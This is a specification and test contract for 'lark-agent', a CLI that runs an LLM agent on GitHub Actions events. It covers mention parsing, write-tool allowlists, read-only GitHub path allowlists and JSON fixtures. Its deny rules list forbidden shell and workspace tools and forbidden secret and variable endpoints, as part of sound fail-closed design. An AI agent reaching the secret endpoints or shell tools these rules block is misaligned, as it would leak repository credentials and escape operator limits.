# Smart Command And Built-In GitHub Support

This file is the long-lived, testable contract. Scene ids `SC-*` and `GW-*`
must appear in test names. Operator steps are in `docs/smart-command.md`; the
documentation map is `docs/README.md`. `changes/smart-command-and-github.md`
records why this round exists; if it conflicts with this file after merge, this
file wins.

Tests must not invent product behavior. If a field, error substring, HTTP path,
JSON key, or YAML `if` is not in this file, it is out of scope.

## SC / GW index

- Runtime: `SC-01` … `SC-80` in this file. `spec/behavior.md` keeps the
  one-line index for `SC-01` … `SC-13`.
- Example workflows: `GW-01` … `GW-10` below.

## Three layers

1. **Smart command** (`lark-agent run`): the same agent main loop, no Lark
   WebSocket, HTTP-only Lark when an allowlisted tool needs it, exit when done.
2. **Built-in GitHub support** (`lark-agent github run`): read the GitHub event
   JSON, token, Actions-injected secrets/vars, and repository bytes at the
   event SHA, then invoke the smart-command loop. Without this layer those
   GitHub facts are unavailable.
3. **GitHub example workflows**: YAML + prompt files that call layer 2.
   Ordinary command `github notify` may still be a later job in the same
   workflow.

`github notify` remains an ordinary command: no model, HTTP-only Lark send.

Do not call this a short-lived nickname, a lightweight agent, or a GitHub-only
agent. GitHub is the first built-in integration, not a nickname for smart
commands.

## Locked decisions

These close gaps that a test author would otherwise guess. They follow existing
CLI envelopes, fail-closed security, and the already confirmed product.

1. Success stdout uses the existing CLI envelope `{"ok":true,"data":{...}}`.
   Failure: stdout empty; stderr one JSON object `{"ok":false,"error":{...}}`;
   validation/config/authorization exit 2; other failures exit 1.
2. Actions secrets and variables are consumed from **process environment** as
   GitHub Actions already injects them. The runtime must not call
   `/actions/secrets` or `/actions/variables` HTTP APIs.
3. `github run` does not register shell, workspace read/search/write, git
   mutation, Base/Wiki mutation, or artifact/log tools. Repository bytes come
   only from GitHub HTTP at the event SHA. `lark-agent run` (no GitHub) may
   register workspace **read/search/list** only; shell and workspace write stay
   absent.
4. Work kind is `smart_command`. The model finishes with `submit_decision`
   whose `decision` must be `record`. That tool never sends Lark or GitHub.
   GitHub comments, checks, titles, Lark posts, and job outputs happen only
   through the named write tools.
5. Each process allows **at most one successful** `post_github_comment`,
   `update_github_issue_title`, `send_lark_message`, and `write_job_output`.
   `upsert_github_check` may GET then POST or PATCH as one logical upsert.
6. `send_lark_message` body is model text. Go appends the same HMAC GitHub
   reference footer used by `github notify` when a validated reference exists.
   Lark idempotency key prefix is `ghs-` (notify stays `ghn-`) so the two
   commands cannot collide on the same chat+reference.
7. Comment events without a whole-token `@lark-agent` exit **0** with
   `data.skipped=true` and no model (`SC-17`). Workflow `if` should skip first;
   a looser `contains()` must not fail CI.
8. Unknown slash command with comments allowed: one help comment, no model,
   exit 0 (`SC-09`). Unknown slash command without comments: exit 2, no model.
9. Unknown comment `--flag`: exit 2, **no** GitHub comment, no model.
10. GW-04 must not summarize the workflow named `CI` (`github.event.workflow_run.name != 'CI'`),
    so it does not double-post with `.github/workflows/lark-notify.yml`.
11. Jobs that need Lark or model secrets use GitHub Environment `lark-production`
    and skip when `github.event.pull_request.head.repo.full_name` (if present)
    is not `github.repository`.
12. Docker Action default `mode=notify`. Existing `lark-notify.yml` stays valid
    without new inputs. `Dockerfile` ENTRYPOINT becomes a dispatcher, not
    `github notify` hardcoded as the only command.
13. Outbound GitHub comment, check text, title, Lark body, stderr, and stdout
    must not contain the exact values of `LARK_AGENT_APP_SECRET`,
    `GITHUB_TOKEN`, or `OPENAI_API_KEY`. If a write body contains one of those
    strings, the tool fails and no HTTP is sent (`SC-22`).
14. Event JSON **ignores unknown fields** (GitHub payloads are large).
    Success `data` JSON **forbids unknown fields** in tests
    (`DisallowUnknownFields`).

## Process pipeline (`github run`)

A step that fails after the command has started writes empty stdout and a typed
stderr error unless the step says otherwise. “No model” means the fake/real
model HTTP client is never invoked.

| Step | Action | Failure |
|---|---|---|
| 1 | Parse CLI flags. | Unknown flag → cobra/non-zero, no model (`SC-14`). |
| 2 | If `GITHUB_ACTIONS=true`, assemble config from env (below). Else load `--config` YAML. | Missing required env/config → exit 2, no model. |
| 3 | In Actions, GitHub support is enabled and `allowed_repositories` is exactly `[GITHUB_REPOSITORY]`. Locally, `github.enabled` must be true. | Disabled → exit 2, message contains `github bridge is disabled`. |
| 4 | Require model credentials: `OPENAI_API_KEY` or the same Keychain model login the daemon uses. | Missing → `SC-11`, exit 2, no GitHub/Lark writes. |
| 5 | Require event path and name: `--event-path` / `--event-name` else `GITHUB_EVENT_PATH` / `GITHUB_EVENT_NAME`. | Missing → `SC-15`, exit 2, message contains `GITHUB_EVENT_PATH and GITHUB_EVENT_NAME are required`. |
| 6 | Read the event file. | Missing file → exit 1, subtype `file_io`. Empty bytes → exit 2, message contains `github event JSON is empty`. Invalid JSON → exit 2, message contains `decode github event JSON`. |
| 7 | `ParseEvent(name, data)`. | Unsupported name → `SC-02`, exit 2, message contains `unsupported github event`. Invalid identifiers → exit 2, message contains `invalid` and the event name. |
| 8 | Allowlist `reference.repository` against `github.allowed_repositories` (exact string match, case-sensitive). | Mismatch → `SC-16`, exit 2, message contains `github repository is not allowed`. |
| 9 | If name is `issue_comment` or `pull_request_review_comment`, parse mention. No whole-token mention → `SC-17` success skip (exit 0, `skipped=true`, no model). | Unknown `--flag` → exit 2, no comment (`SC-44`). |
| 10 | If command is non-empty and not `review`/`title`/`check` → help path (`SC-09`). | Help comment HTTP fail → exit 1, stdout empty. |
| 11 | Effective allowlist = unique union of CLI `--allowed-actions` and slash extras, then if dry-run drop every write name. | Unknown CLI write name → `SC-21`, exit 2, message contains `unknown allowed action`. |
| 12 | If effective allowlist contains `send_lark_message` and not dry-run, `--chat-id` or `LARK_CHAT_ID` is required. | Missing → exit 2, message contains `--chat-id is required`. |
| 13 | Resolve `--prompt-file` (required unless `--message` non-empty) and optional `--rules-file` and slash contract file. Paths: relative, no `..`, no absolute, must stay inside workspace root. | Missing required file → `SC-18`, exit 2, message contains `prompt file`. Path escape → exit 2, message contains `prompt path`. |
| 14 | Open process-local SQLite (`--state` or a temp file). Must not open the daemon live DB path. | `SC-19`. |
| 15 | Construct Lark HTTP client only if a Lark tool is in the catalog. Must not construct WebSocket (`SC-01`). | Client error → exit 1. |
| 16 | If PR number is set and `head_sha` is empty, GET the pull request to fill `head_sha` / `html_url`. Failure: `partial=true` unless the slash command is `review` or `check` or the workflow allowlist contains `upsert_github_check`, in which case exit 2 before model. | |
| 17 | Inject typed event summary into agent context (`SC-20`). Always inject. | |
| 18 | Run the agent loop until `submit_decision` `record`, turn limit, or failure. When the loop exhausts its terminal-only attempts, hand the trajectory to the terminal finalizer once. | Finalizer converges → exit 0, `record`, no further writes (`SC-81`). Finalizer unavailable or failing, or turn limit reached → exit 1, no further writes (`SC-61`). |
| 19 | Print success envelope. Exit 0. | After model start, still no secrets in stdout/stderr. |

`lark-agent run` without GitHub: skip steps 5–8, 9–10, 16–17 GitHub injection;
require `--message` or `--prompt-file`; GitHub tools are absent.

## CLI

Global flags already on the root command (`--config`, `--state`) apply.

### `lark-agent run`

| Flag | Required | Default | Validation |
|---|---|---|---|
| `--prompt-file` | yes unless `--message` non-empty after trim | empty | relative workspace path |
| `--message` | no | empty | UTF-8 text; not interpolated into shell |
| `--rules-file` | no | empty | relative workspace path |
| `--allowed-actions` | no | empty = no write tools | comma-separated; trim space; empty tokens ignored; duplicates keep first-seen order; unknown name `SC-21` |
| `--chat-id` | if `send_lark_message` effectively allowed and not dry-run | `LARK_CHAT_ID` | non-empty |
| `--dry-run` | no | false | boolean flag; `--dry-run=true`/`false` as cobra bool is allowed on **CLI**; comment parser rejects `=` form (`SC-23`) |
| `--state` | no | temp sqlite | tests must not point this at the daemon live DB |

### `lark-agent github run`

All `run` flags plus:

| Flag | Required | Default |
|---|---|---|
| `--event-path` | if env unset | `GITHUB_EVENT_PATH` |
| `--event-name` | if env unset | `GITHUB_EVENT_NAME` |

`--help` substrings (help contract tests): `smart command`, `WebSocket`,
`--prompt-file`, `--allowed-actions`, `--dry-run`, `GITHUB_EVENT_PATH`.

`lark-agent run --help` substrings: `smart command`, `WebSocket`,
`--prompt-file`, `--allowed-actions`, `--dry-run`.

`lark-agent github notify --help` stays the current contract (`--chat-id`,
`--dry-run`, `GITHUB_EVENT_PATH`, `HTTP-only`).

### Actions environment (`GITHUB_ACTIONS=true`)

Required for any `github run` that may send Lark:

- `LARK_AGENT_APP_ID`
- `LARK_AGENT_APP_SECRET`
- `LARK_AGENT_LARK_BASE_URL`
- `GITHUB_TOKEN`
- `GITHUB_REPOSITORY`
- `GITHUB_EVENT_PATH`
- `GITHUB_EVENT_NAME`

Required for the model: `OPENAI_API_KEY` (or the daemon’s existing equivalent
model env). The loop model resolves `model.roles.agent` and the terminal
finalizer resolves `model.roles.finalizer`; both use the same profile lookup,
Keychain fallback and env overrides the daemon uses. Optional:
`OPENAI_BASE_URL`, `OPENAI_MODEL`, `LARK_CHAT_ID`,
`GITHUB_OUTPUT`, `GITHUB_WORKSPACE`, `GITHUB_RUN_ID`, `GITHUB_SHA`,
`GITHUB_API_URL` (GitHub Enterprise API base; default `https://api.github.com`
when unset).

Workspace root is `GITHUB_WORKSPACE` when set, else process cwd.

Locally, GitHub API base comes from `github.api_base_url`; token from Keychain
or `GITHUB_TOKEN`.

## Action and image

### `action.yml` inputs

| Input | Required | Default | Maps to |
|---|---|---|---|
| `mode` | no | `notify` | `LARK_AGENT_MODE` |
| `lark_app_id` | yes | | `LARK_AGENT_APP_ID` |
| `lark_app_secret` | yes | | `LARK_AGENT_APP_SECRET` |
| `lark_chat_id` | yes when mode is `notify`; optional for `run` | | `LARK_CHAT_ID` |
| `lark_base_url` | yes | | `LARK_AGENT_LARK_BASE_URL` |
| `github_token` | yes | | `GITHUB_TOKEN` |
| `prompt_file` | when `mode=run` | empty | `LARK_AGENT_PROMPT_FILE` |
| `rules_file` | no | empty | `LARK_AGENT_RULES_FILE` |
| `allowed_actions` | no | empty | `LARK_AGENT_ALLOWED_ACTIONS` |
| `dry_run` | no | `false` | `LARK_AGENT_DRY_RUN` (`true`/`false`) |
| `message` | no | empty | `LARK_AGENT_MESSAGE` |

`runs.using` remains `docker`. `runs.image` remains `Dockerfile`.

### Dispatcher (`SC-52`, `SC-53`)

`Dockerfile` `ENTRYPOINT` is `/usr/local/bin/lark-agent-action` (script) which
`exec`s `/usr/local/bin/lark-agent`:

- `LARK_AGENT_MODE` empty or `notify`: `github notify --chat-id "$LARK_CHAT_ID"`
- `LARK_AGENT_MODE=run`: `github run` plus `--prompt-file`, `--rules-file`,
  `--allowed-actions`, `--message`, `--chat-id`, `--dry-run` when the
  corresponding env is non-empty. `--dry-run` is passed only when
  `LARK_AGENT_DRY_RUN` is the string `true`.
- any other mode: exit 2, stderr contains `unknown mode`, no model (`SC-34`).

Existing `.github/workflows/lark-notify.yml` does not set `mode` and must keep
sending ordinary notify (`SC-54`).

## stdout / stderr / exit

Success (`SC-03`, `SC-35`):

```json
{
  "ok": true,
  "data": {
    "mode": "run",
    "dry_run": false,
    "skipped": false,
    "partial": false,
    "event_name": "issue_comment",
    "command": "",
    "allowed_actions": ["post_github_comment"],
    "repository": "example/widgets",
    "comment_id": "",
    "check_id": "",
    "message_id": "",
    "title": "",
    "outputs": {},
    "reference": {}
  }
}
```

| `data` field | Type | Rule |
|---|---|---|
| `mode` | string | always `run` for this command (`notify` stays on `github notify`) |
| `dry_run` | bool | CLI or comment `--dry-run` |
| `skipped` | bool | true when `SC-17` or GW-09.1 skip; still exit 0 |
| `partial` | bool | enrichment/compare/file read failed or `submit_decision` evidence insufficient |
| `event_name` | string | `GITHUB_EVENT_NAME`; empty on `lark-agent run` |
| `command` | string | slash name without `/`; empty string not `null` |
| `allowed_actions` | string array | effective writes; never `null`; empty when dry-run or skip |
| `repository` | string | parsed `owner/name` or empty on `lark-agent run` |
| `comment_id` | string | decimal GitHub comment id after a successful post; else `""` |
| `check_id` | string | decimal check-run id after upsert; else `""` |
| `message_id` | string | Lark message id after send; else `""` |
| `title` | string | new title after PATCH; else `""` |
| `outputs` | object | `{"changelog":"<text>"}` after `write_job_output`; else `{}` |
| `reference` | object | validated `GitHubReference`; omitted/empty object on `lark-agent run` |

`github notify` success envelope is unchanged (`message_type`, `idempotency_key`,
`content` on dry-run).

Failure: exit non-zero, **stdout empty**, stderr:

```json
{"ok":false,"error":{"type":"validation","subtype":"invalid_argument","message":"..."}}
```

Tests match `error.type` and a **substring** of `error.message` listed in the
scene. Secrets must not appear in that JSON (`SC-22`).

## Mention parser

Applies only to `issue_comment` and `pull_request_review_comment`. Body is
`comment.body` (not `issue.body`). Other events skip this parser.

**Token `MENTION`:** ASCII `@lark-agent`, case-insensitive. Whole token only:
left is start-of-string or Unicode whitespace; right is end-of-string, Unicode
whitespace, or one ASCII punctuation from `[.,!?;:]`.

The match consumes only `@lark-agent`. After a match, if the next rune is in
`[.,!?;:]`, consume that one punctuation. Then trim leading Unicode whitespace
(including newlines). `@lark-agent[bot]` is **not** a mention (`[` is not a
right delimiter). `` ` `` immediately left of `@` is not whitespace, so
backtick-wrapped `@lark-agent` is not a mention.

**Algorithm:**

1. Find the first `MENTION`. If none → not a smart-command comment (`SC-17`).
2. Remainder after the consumed mention and optional punctuation, left-trimmed.
3. If remainder is empty: `command=""`, `dry_run=false`, `extra_prompt=""`.
4. If the first token (split on Unicode whitespace) matches
   `^/[a-z][a-z0-9-]*$`, `command` is that token without `/`. Otherwise
   `command=""`.
5. From the tokens after the command (or from the first token if no command),
   consume leading tokens matching `^--[a-z][a-z0-9-]*$` **only**. Allowed:
   `--dry-run`. Duplicate `--dry-run` still means dry-run (`SC-74`).
   `--dry-run=true` / `--dry-run=false` / any other `--*` → parse error
   (`SC-23`, `SC-44`): exit 2, no model, no GitHub comment, stderr contains
   `--dry-run` and `unknown` or `invalid`.
6. `extra_prompt` is the leftover raw remainder after the consumed command and
   flag tokens, with one leading space or newline stripped, internal newlines
   preserved, trailing whitespace preserved only as in the original leftover
   (tests use `strings.TrimSpace` equality except SC-08b which preserves the
   Chinese line as the whole leftover).

Known commands: `review`, `title`, `check`. `/REVIEW` does not match the
command regex → `command=""`, extra_prompt starts with `/REVIEW` (`SC-43`).

Parser fixtures:

| Id | Body | command | dry_run | extra_prompt | next |
|---|---|---|---|---|---|
| SC-06 | `@lark-agent why is this failing` | `""` | false | `why is this failing` | model |
| SC-07 | `@lark-agent /review focus on auth` | `review` | false | `focus on auth` | model |
| SC-08 | `@lark-agent review now` | `""` | false | `review now` | model |
| SC-09 | `@lark-agent /nope` | `nope` | false | `""` | help, no model |
| SC-23 | `@lark-agent /review --dry-run` | `review` | true | `""` | model, no writes |
| SC-24 | `@lark-agent --dry-run hello` | `""` | true | `hello` | model, no writes |
| SC-25 | `@lark-agent` | `""` | false | `""` | model (empty ask) |
| SC-26 | `please @LARK-AGENT /title` | `title` | false | `""` | model |
| SC-27 | `foo@lark-agent /review` | n/a | n/a | n/a | skip `SC-17` |
| SC-08b | `@lark-agent /review\n重点看权限` | `review` | false | `重点看权限` | model |
| SC-43 | `@lark-agent /REVIEW now` | `""` | false | `/REVIEW now` | model |
| SC-44 | `@lark-agent /review --force` | n/a | n/a | n/a | exit 2, no comment |
| SC-45 | `@lark-agent[bot] /review` | n/a | n/a | n/a | skip `SC-17` |
| SC-46 | ``see `@lark-agent` please`` | n/a | n/a | n/a | skip `SC-17` |
| SC-47 | `@lark-agent first @lark-agent /title` | `""` | false | `first @lark-agent /title` | first mention wins; `/title` is prose |
| SC-74 | `@lark-agent --dry-run --dry-run hi` | `""` | true | `hi` | model, no writes |
| SC-75 | `@lark-agent /check` | `check` | false | `""` | model |
| SC-76 | `@lark-agent /title make it shorter` | `title` | false | `make it shorter` | model |
| SC-08c | `@lark-agent.` | `""` | false | `""` | model |
| SC-08d | `@lark-agent. why` | `""` | false | `why` | model |

Unknown command help body (GitHub comment or stderr) must contain the
substrings `/review`, `/title`, `/check`, `--dry-run`, and the unknown token
including slash (example `/nope`).

`/review` or `/check` on a non-PR issue: no check HTTP. If comments allowed,
one comment body contains `pull request` (case-insensitive). Exit 0 (`SC-28`).
JSON `command` is still `review` or `check`; `allowed_actions` does not include
`upsert_github_check`.

## Allowlist algebra

Known write names (only these may appear in `--allowed-actions`):

`post_github_comment`, `upsert_github_check`, `update_github_issue_title`,
`send_lark_message`, `write_job_output`.

Parse: split on comma, `strings.TrimSpace` each, drop empty, fail on unknown
(`SC-21`, `SC-77` with spaces). `--allowed-actions=merge` fails (`SC-21`).

Slash extras (union, not replace):

| command | extra names | extra names if no PR number |
|---|---|---|
| `""` | none | none |
| `review` | `upsert_github_check` | none (`SC-28`) |
| `title` | `update_github_issue_title` | `update_github_issue_title` |
| `check` | `upsert_github_check` | none (`SC-28`) |

If `--dry-run` (CLI or comment), effective write set is empty. Read tools stay.

`SC-04`: name omitted from effective set → tool execute returns typed permission
error whose message contains `not allowed`; no HTTP write.
`SC-10`: dry-run + `post_github_comment` → same denial.

## GitHub reference (`schema_version` 1)

`GitHubReference` fields after this round:

| Field | JSON | Rule |
|---|---|---|
| `schema_version` | `schema_version` | must be `1` |
| `repository` | `repository` | `^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$` |
| `kind` | `kind` | `workflow_run` \| `pull_request` \| `issue` \| `push` \| `release` \| `workflow_dispatch` |
| `workflow_run_id` | `workflow_run_id` | required > 0 when kind is `workflow_run` |
| `workflow_run_attempt` | `workflow_run_attempt` | >= 0 |
| `pull_request_number` | `pull_request_number` | required > 0 when kind is `pull_request` |
| `issue_number` | `issue_number` | required > 0 when kind is `issue`; on PR comment events also set to the PR number |
| `comment_id` | `comment_id` | required > 0 on comment events |
| `head_sha` | `head_sha` | empty or 40/64 hex |
| `before_sha` | `before_sha` | empty or 40/64 hex; 40 zeros allowed on first push |
| `ref` | `ref` | required non-empty when kind is `push` |
| `tag_name` | `tag_name` | required non-empty when kind is `release` |
| `html_url` | `html_url` | empty or `http`/`https` URL with host |

`Validate()` rejects unknown kinds. `ExternalKey()`:

- `workflow_run`: `{repo}:workflow_run:{id}:{attempt}` (unchanged)
- `pull_request`: `{repo}:pull_request:{n}` (unchanged)
- `issue`: `{repo}:issue:{n}`
- `push`: `{repo}:push:{head_sha}`
- `release`: `{repo}:release:{tag_name}`
- `workflow_dispatch`: `{repo}:workflow_dispatch:{pr}` if PR number set, else
  `{repo}:workflow_dispatch:{GITHUB_RUN_ID}` if set, else `{repo}:workflow_dispatch`

HMAC marker encode/decode uses the full JSON struct. Daemon follow-up on a
smart-command Lark message must accept the new kinds (`SC-39`).

### `ParseEvent` required fields

Unknown `GITHUB_EVENT_NAME` (example `fork`) → `SC-02`. Extra JSON keys ignored.

| event | kind | required JSON paths | snapshot extras |
|---|---|---|---|
| `workflow_run` | `workflow_run` | `repository.full_name`, `workflow_run.id` > 0, `workflow_run.head_sha`, `workflow_run.html_url` | name/status/conclusion/action; first `workflow_run.pull_requests[].number` → `pull_request_number` if present |
| `pull_request` | `pull_request` | `repository.full_name`, PR number (`pull_request.number` or top-level `number`), `pull_request.head.sha`, `pull_request.html_url` | `title`, `action` |
| `issues` | `issue` | `repository.full_name`, `issue.number`, `issue.html_url` | `title`, `action`; `issue_number` |
| `issue_comment` | `pull_request` if `issue.pull_request` object present else `issue` | repo, `issue.number`, `comment.id` | `title` from `issue.title`, `action`, `comment_id`; `head_sha` from `pull_request.head.sha` when present |
| `pull_request_review_comment` | `pull_request` | repo, PR number, `comment.id`; `pull_request.head.sha` when present | `comment_id` |
| `push` | `push` | repo, `ref`; `after` or `head_commit.id` as `head_sha` | `before` → `before_sha` (40 zeros allowed) |
| `release` | `release` | repo, `release.tag_name`, `release.html_url` | `action`, `title` = tag |
| `workflow_dispatch` | `workflow_dispatch` | repo | if `inputs.pr_number` present (JSON string or number), parse as integer > 0 → `pull_request_number`; empty/omitted is ok; `0` or non-integer fails |

`SC-13` success decoding. `SC-29`: `workflow_run` missing `id` fails.
`SC-30`: `push` missing `repository.full_name` fails.
`SC-56`: `inputs.pr_number` as string `"12"` succeeds.
`SC-57`: `before` of 40 zeros is stored, not an error.
`SC-72`: `issue_comment` missing `comment.id` fails.

Hostile strings in `title`/`body`/`ref` are copied as data (`SC-48`). They are
never interpolated into a shell command.

### Minimal fixtures (tests may use these bytes)

Synthetic repo `example/widgets`. SHA
`0123456789abcdef0123456789abcdef01234567`. URLs on `https://github.example`.

`workflow_run` — same shape as `internal/github/reference_test.go`.

`issue_comment` on an issue:

```json
{
  "action": "created",
  "repository": {"full_name": "example/widgets"},
  "issue": {
    "number": 7,
    "title": "printer smoke",
    "html_url": "https://github.example/example/widgets/issues/7"
  },
  "comment": {"id": 1001, "body": "@lark-agent why is this failing", "user": {"login": "example-user", "type": "User"}}
}
```

`issue_comment` on a PR (kind `pull_request`): same with
`"pull_request": {"html_url": "https://github.example/example/widgets/pull/12"}`
inside `issue`, `issue.number` 12 (`SC-55`).

`pull_request_review_comment`:

```json
{
  "action": "created",
  "repository": {"full_name": "example/widgets"},
  "pull_request": {
    "number": 12,
    "html_url": "https://github.example/example/widgets/pull/12",
    "head": {"sha": "0123456789abcdef0123456789abcdef01234567"}
  },
  "comment": {"id": 2002, "body": "@lark-agent /review focus on auth"}
}
```

`issues` opened:

```json
{
  "action": "opened",
  "repository": {"full_name": "example/widgets"},
  "issue": {
    "number": 7,
    "title": "printer smoke",
    "html_url": "https://github.example/example/widgets/issues/7"
  }
}
```

`push` to master:

```json
{
  "ref": "refs/heads/master",
  "before": "0000000000000000000000000000000000000000",
  "after": "0123456789abcdef0123456789abcdef01234567",
  "repository": {"full_name": "example/widgets"},
  "head_commit": {"id": "0123456789abcdef0123456789abcdef01234567"}
}
```

`release`:

```json
{
  "action": "published",
  "repository": {"full_name": "example/widgets"},
  "release": {
    "tag_name": "v1.2.3",
    "html_url": "https://github.example/example/widgets/releases/tag/v1.2.3"
  }
}
```

`workflow_dispatch`:

```json
{
  "inputs": {"pr_number": "12"},
  "repository": {"full_name": "example/widgets"}
}
```

## Injected context (`SC-20`)

Before the first model call, the bundle contains a JSON object (field name
`github_event_summary`) with at least:

```json
{
  "event_name": "issue_comment",
  "action": "created",
  "repository": "example/widgets",
  "kind": "issue",
  "issue_number": 7,
  "pull_request_number": 0,
  "comment_id": 1001,
  "head_sha": "",
  "before_sha": "",
  "ref": "",
  "tag_name": "",
  "html_url": "https://github.example/example/widgets/issues/7",
  "title": "printer smoke",
  "command": "",
  "extra_prompt": "why is this failing",
  "dry_run": false,
  "allowed_actions": ["post_github_comment"]
}
```

Numeric fields use JSON numbers. Empty SHA is `""`. The model may ignore this
object; tests assert it is present on the first provider request.

`GITHUB_TOKEN` and secrets are not in this object.

## Tool catalog

### Always registered on smart commands

| Tool | Args | Side effect |
|---|---|---|
| `submit_decision` | see below | none |

### Registered when GitHub support loaded

| Tool | Args the model may send | Bound by Go | HTTP |
|---|---|---|---|
| `get_github_context` | `sections`: array of `summary` \| `checks` \| `files` \| `reviews` | repository, ids, sha | GET allowlist |
| `get_github_file` | `path` (relative file path) | repo + `head_sha` | `GET /repos/{repo}/contents/{path}?ref={head_sha}` |
| `get_github_compare` | none | `before_sha`...`head_sha` or previous-release tag...`tag_name` | `GET /repos/{repo}/compare/{base}...{head}` |

`get_github_file`: `path` must be relative, no `..`, no leading `/`, no NUL.
Missing `head_sha` → tool error, no HTTP (`SC-58`). Size > 1 MiB decoded →
tool error, `partial` may be set. Directory content listing is rejected.

`get_github_compare`: if `before_sha` is 40 zeros, return a typed result
`{ "unavailable": true, "reason": "no previous commit" }` and no HTTP; JSON
`partial` stays false unless another read failed.

`get_github_context` for `issue` uses `GET /repos/{repo}/issues/{n}` for
summary. `checks` with no `workflow_run_id` is a no-op success. `files` /
`reviews` require `pull_request_number > 0`.

### Registered when `--chat-id` / `LARK_CHAT_ID` is non-empty

| Tool | Model args | Bound |
|---|---|---|
| `get_lark_context` | `mode`, `limit`, optional `message_id`; `chat_id` optional | if `chat_id` present and ≠ configured, reject `SC-05`; if omitted, Go uses configured chat |
| `search_lark_messages` | `query`; `chat_id` optional | same chat bind |

Limit default 20, max 30 (existing behavior).

### Write tools (only if in effective allowlist and not dry-run)

Model JSON **must not** include keys `repository`, `owner`, `repo`,
`issue_number`, `pull_number`, `sha`, `chat_id`, `base_url`, `token`,
`head_sha`, `check_run_id`. If any appear, reject `SC-05` even when the value
matches the event. `decodeArgs` uses `DisallowUnknownFields`.

#### `post_github_comment`

Args: `{ "body": string }` required, trim empty → error.
Max 65536 bytes (`SC-63`).
HTTP: `POST /repos/{event_repo}/issues/{issue_or_pr_number}/comments`
body `{"body":"<text>"}` only. Always the **issue comments** API, including
for PRs. Never `POST /pulls/{n}/comments` (inline review threads).
At most one successful POST per process; a second call returns permission
error `already posted` (`SC-41`).
On success, `data.comment_id` is the response `id` decimal string.

#### `upsert_github_check`

Args: `{ "conclusion": "success"|"failure"|"neutral", "title": string, "summary": string, "text": string optional }`.
Other conclusions → `SC-32`, no HTTP.
`title` max 255, `summary`/`text` max 65535; over limit → `SC-62`, no HTTP.
Requires `head_sha` and `pull_request_number > 0`.
Check name is exactly `lark-agent-gate` (`SC-49`).
HTTP:

1. `GET /repos/{repo}/commits/{head_sha}/check-runs?check_name=lark-agent-gate`
2. If an item has that name, `PATCH /repos/{repo}/check-runs/{id}` with
   `status=completed`, `conclusion`, `output:{title,summary,text?}`.
3. Else `POST /repos/{repo}/check-runs` with `name=lark-agent-gate`,
   `head_sha`, `status=completed`, `conclusion`, `output`.

Never `POST /repos/{repo}/pulls/{n}/merge` or any path containing `/merge`
(`SC-12`, `SC-31`).

#### `update_github_issue_title`

Args: `{ "title": string }` required, trim empty → error, max 256 chars.
HTTP: `PATCH /repos/{repo}/issues/{n}` body `{"title":"<text>"}` only.
At most one successful PATCH (`SC-41` analog). `data.title` becomes the new
title. GW-10.2: if the model never calls the tool, no PATCH.

#### `send_lark_message`

Args: `{ "text": string }` required, trim empty → error, max 4000 runes.
Go sends existing bot `SendMessageAsBot` as `text` (not `post`) to the
configured chat only. After the model text, Go appends `\n` and the HMAC
marker (`SC-39`). Idempotency key:
`ghs-` + first 32 hex chars of SHA-256(`chat_id + "\x00" + ExternalKey() + "\x00v1"`),
total length ≤ 50. At most one successful send.
On Lark HTTP failure: exit 1 after the loop (command failure).
`data.message_id` is the sent id.

#### `write_job_output`

Args: `{ "name": string, "value": string }`. `name` must be `changelog`
(`SC-33`). If `GITHUB_OUTPUT` unset, still succeed for tests by writing a temp
file created by the command and reported only in `data.outputs`.
Format (multiline, `SC-42`):

```text
changelog<<LARK_AGENT_EOF
<value>
LARK_AGENT_EOF
```

If `value` contains the exact line `LARK_AGENT_EOF`, the tool fails, no write.

### Forbidden registry names on `github run` (`SC-50`)

`shell`, `edit_workspace`, `write_workspace`, `read_workspace`,
`search_workspace`, `list_workspace`, `explore_workspace`, any git write,
`update_base_status`, `reply_resource_comment`, `download-artifact`.
A model request for a missing tool is a provider-level unknown tool; Go must
not register them.

### Read HTTP allowlist (host = configured GitHub API base)

Only these GET path prefixes on `{event_repo}`:

- `/repos/{repo}`
- `/repos/{repo}/actions/runs/{id}`
- `/repos/{repo}/actions/runs/{id}/jobs`
- `/repos/{repo}/commits/{sha}/check-runs`
- `/repos/{repo}/check-runs/{id}/annotations`
- `/repos/{repo}/pulls/{n}`
- `/repos/{repo}/pulls/{n}/files`
- `/repos/{repo}/pulls/{n}/reviews`
- `/repos/{repo}/issues/{n}`
- `/repos/{repo}/issues/{n}/comments`
- `/repos/{repo}/contents/`
- `/repos/{repo}/compare/`
- `/repos/{repo}/releases`

Forbidden even on GET: `/git/`, `/actions/runners`, `/installation`, `/orgs/`,
other repositories, `/actions/secrets`, `/actions/variables`.

Fake transports in tests fail the process if they observe a forbidden path
(`SC-12`, `SC-31`).

## `submit_decision` for `smart_command` (`SC-40`)

Work kind is `smart_command`. Fast-path / coding-question / delegated-reply
gates do not apply.

Required args:

- `decision`: only `record` (other enums → tool error, model may retry)
- `relevance_confidence`: number
- `risk`: `low` \| `medium` \| `high` \| `forbidden`
- `reason`: string
- `skipped`: bool, optional, default false (GW-09.1 sets true)
- `reply_outcome`: `complete` \| `partial` \| `clarification` (maps to
  `data.partial` when `partial` or `clarification`)

`reply_text` if present is **ignored** (not sent). Tests assert no Lark IM and
no GitHub HTTP from this tool.

When the loop exhausts its terminal-only attempts, the terminal finalizer runs
once with the same trajectory and no tools, exactly as in the daemon. A
finalizer `record` ends the command successfully (`SC-81`). If the finalizer
errors or still returns no valid `record`, exit 1 (`SC-61`). Exhausting the turn
limit stays a hard exit 1 and does not reach the finalizer, matching the daemon.
The finalizer never widens the write allowlist, so a dry run stays a dry run.
Max turns: 20. Max tool calls: 12. Loop timeout: 8 minutes (YAML
`timeout-minutes: 10` gives the job slack).

## Prompt and contract files

Workspace paths (live tree). Twins under `examples/github-agent/lark-agent/`
with the same relative names.

| Path | Used by |
|---|---|
| `.github/lark-agent/prompts/ask.md` | GW-01 default |
| `.github/lark-agent/prompts/review.md` | GW-02, GW-03, `/review` contract |
| `.github/lark-agent/prompts/event-summary.md` | GW-04 |
| `.github/lark-agent/prompts/changelog.md` | GW-05 |
| `.github/lark-agent/prompts/release-notes.md` | GW-06 |
| `.github/lark-agent/prompts/pr-summary.md` | GW-07 |
| `.github/lark-agent/prompts/merge-check.md` | GW-08, `/check` |
| `.github/lark-agent/prompts/notify-style.md` | GW-09 |
| `.github/lark-agent/prompts/title-rules.md` | GW-10, `/title` |

Every prompt file must contain these substrings (help/doc tests may reuse):

- `smart command`
- `submit_decision`
- `do not merge`
- `do not invent`

Slash contract: when command is `review`/`title`/`check`, Go appends the
corresponding file after the workflow `--prompt-file`. Missing contract file
is `SC-18`.

